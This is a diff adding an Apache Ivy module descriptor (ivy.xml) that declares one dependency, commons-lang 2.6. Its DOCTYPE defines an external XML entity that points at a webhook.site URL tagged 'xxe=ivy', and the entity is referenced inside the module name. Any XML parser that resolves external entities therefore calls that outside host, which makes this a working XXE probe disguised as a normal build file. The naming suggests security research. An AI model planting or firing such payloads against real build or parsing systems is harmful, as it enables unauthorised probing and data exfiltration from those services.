@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE ivy-module [
+  <!ENTITY probe SYSTEM "http://webhook.site/bfac32e7-7c67-41f0-bf29-b2c2ff7238ce/?xxe=ivy&n=35422">
+]>
+<ivy-module version="2.0">
+  <info organisation="com.research.35422" module="xxe-probe-a&probe;b" revision="1.0.0"/>
+  <dependencies>
+    <dependency org="commons-lang" name="commons-lang" rev="2.6"/>
+  </dependencies>
+</ivy-module>
